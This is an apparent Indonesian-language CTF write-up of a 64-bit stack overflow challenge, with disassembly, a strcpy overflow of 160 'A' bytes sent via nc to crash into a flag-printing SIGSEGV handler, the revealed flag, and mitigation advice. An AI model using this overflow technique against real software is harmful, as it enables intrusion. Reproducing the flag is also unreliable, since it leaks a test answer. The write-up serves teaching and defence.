# Writeup: Binary Gauntlet 0 (Challenge ID: 167)

- Platform: CyLab Security Academy (picoCTF)
- Category: Binary Exploitation / 64-Bit Stack Smashing & Exception Vector Redirection
- Difficulty: Medium (diff=2)
- Author: LT 'syreal' Jones
- Event: picoCTF 2021
- Points: 50
- Flag: `088d0d0dfed3a7c041027e01d85e0887` (Format khusus tantangan: tanpa wrapper `academy{}`)

---

## Problem Statement & Scope

Tantangan mengawali seri *Binary Gauntlet* yang membedah korelasi proteksi kompilasi biner dengan teknik eksploitasi memori pada arsitektur x86-64:
> *"This series of problems has to do with binary protections and how they affect exploiting a very simple program. How far can you make it in the gauntlet? The flag for this challenge does not include the standard `academy{}` wrapper.*
> 
> *`gauntlet` `nc -v xebec.cylabacademy.net <port>`"*

Peserta diberikan biner ELF 64-bit (`gauntlet`) dan endpoint TCP interaktif. Berbeda dengan tantangan standar, token bendera pada modul ini berupa representasi digest heksadesimal mentah tanpa awalan `academy{}`. Target audit adalah menganalisis manipulasi pointer tumpukan 64-bit dan memicu penanganan sinyal kegagalan segmen memori (SIGSEGV).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Alokasi Heap vs Kerentanan Salin Tumpukan (CWE-120 & CWE-121):**
   - Biner mengalokasikan buffer berukuran 1000 bita pada heap melalui `malloc(1000)`.
   - Program membaca string masukan dari pengguna menggunakan `fgets(heap_buf, 1000, stdin)`, menampilkan kembali isi string dengan `printf(heap_buf)`, lalu membaca string kedua dengan ukuran hingga 1000 bita ke dalam buffer heap yang sama.
   - Kerentanan krusial muncul saat biner memanggil `strcpy()` untuk memindahkan data dari heap ke tumpukan:
     ```text
     401407:  mov    -0x8(%rbp),%rdx      ; heap_buf
     40140b:  lea    -0x80(%rbp),%rax     ; stack destination (-128 byte)
     40140f:  mov    %rdx,%rsi
     401412:  mov    %rax,%rdi
     401415:  call   4010f0 <strcpy@plt>
     ```
   - Buffer tujuan pada tumpukan dialokasikan pada `-0x80(%rbp)`, yang hanya memiliki kapasitas 128 bita. Karena `strcpy()` menyalin seluruh bita hingga null terminator tanpa batas ukuran tujuan, masukan hingga 1000 bita akan meluap menimpa seluruh frame tumpukan.

2. **Dinamika Stack Frame x86-64:**
   - Pada arsitektur 64-bit:
     - Kapasitas buffer lokal: 128 bita.
     - Saved frame pointer `%rbp`: 8 bita (offset 128 hingga 135).
     - Saved instruction pointer `%rip`: 8 bita (offset 136 hingga 143).
   - Suplai data sepanjang 160 bita memastikan bahwa `%rbp` dan `%rip` tertimpa sepenuhnya oleh nilai karakter masukan.

3. **Mekanisme Pemicuan Sinyal SIGSEGV:**
   - Program mendefinisikan penanganan sinyal SIGSEGV (Signal 11):
     ```text
     0000000000401296 <sigsegv_handler>:
       ...
       4012ac:  lea    0x2e0d(%rip),%rdx        # 4040c0 <flag>
       4012ba:  mov    %rcx,%rsi
       4012bd:  mov    %rax,%rdi
       4012c0:  mov    $0x0,%eax
       4012c5:  call   401150 <fprintf@plt>     # fprintf(stderr, "%s\n", flag)
     ```
   - Ketika fungsi `main()` mengeksekusi `leave` dan `ret`, register `%rip` diisi oleh alamat yang tidak valid (misalnya `0x4141414141414141`). CPU memicu pengecualian *general protection fault* / *page fault*, yang diterjemahkan oleh kernel menjadi sinyal SIGSEGV. Handler menangkap sinyal ini dan mencetak flag ke saluran standar error (*stderr*).

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Inspeksi Karakteristik Biner:**
   - Analisis biner menggunakan `file` dan `checksec`:
     ```bash
     file gauntlet
     checksec --file=gauntlet
     ```
   - Hasil konfirmasi: ELF 64-bit, non-PIE (`0x400000`), No Stack Canary, NX aktif.

2. **Perancangan Skenario Eksploitasi Dua Tahap:**
   - Tahap 1: Mengirimkan string awal (misalnya `probe\n`) untuk memenuhi pemanggilan `fgets()` dan `printf()` pertama.
   - Tahap 2: Mengirimkan deretan 160 bita karakter `A` (`0x41 * 160 + \n`) pada masukan kedua.
   - Biner menyalin muatan 160 bita ke buffer 128 bita melalui `strcpy()`, merusak `%rbp` dan `%rip`.

3. **Injeksi Terhadap Endpoint Jarak Jauh:**
   - Hubungkan ke layanan aktif:
     ```bash
     nc -v xebec.cylabacademy.net 46479
     ```
   - Alur komunikasi:
     ```text
     probe
     probe
     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
     088d0d0dfed3a7c041027e01d85e0887
     ```
   - Layanan mengeksekusi `sigsegv_handler()` dan memuntahkan hash flag 32-karakter.

---

## Flag & Verifikasi

- **Flag Resmi:** `088d0d0dfed3a7c041027e01d85e0887`
- **Catatan Format:** Modul ini secara khusus tidak menggunakan prefix `academy{}` maupun `picoCTF{}`.
- **Bukti Validasi:** REST API CyLab `POST /api/submissions/` merespons dengan status HTTP 201 Created:
  ```json
  {"user": 1072359, "challenge": 167, "flag": "088d0d0dfed3a7c041027e01d85e0887", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Eliminasi Transfer Data Tak Terikat Antar-Lapisan Memori:**
   - Kesalahan desain sering timbul saat programmer menganggap alokasi heap berukuran besar sudah aman, namun kemudian menyalin data tersebut ke stack frame lokal yang sempit menggunakan `strcpy()`. Selalu gunakan `memcpy()` atau `strncpy()` dengan batas kapasitas target eksplisit: `memcpy(stack_buf, heap_buf, sizeof(stack_buf) - 1)`.
2. **Penerapan Stack Canaries pada Lingkungan 64-Bit:**
   - Kompilasi dengan `-fstack-protector-strong`. Nilai canary 64-bit yang diawali null byte (`0x00`) akan mencegah `strcpy()` menimpa pointer kembali tanpa memicu deteksi korupsi.
3. **Audit Sinyal Sistem Operasi:**
   - Jangan pernah menampilkan kredensial sensitif atau token otorisasi di dalam handler sinyal pengecualian memori pada rilis produksi, karena kegagalan proses dapat dieksploitasi sebagai saluran samping (*side-channel*) kebocoran informasi.

---

## Solver Script

Solusi reproduktif terverifikasi tersedia pada:
`scripts/solve_167_binary_gauntlet_0.py`
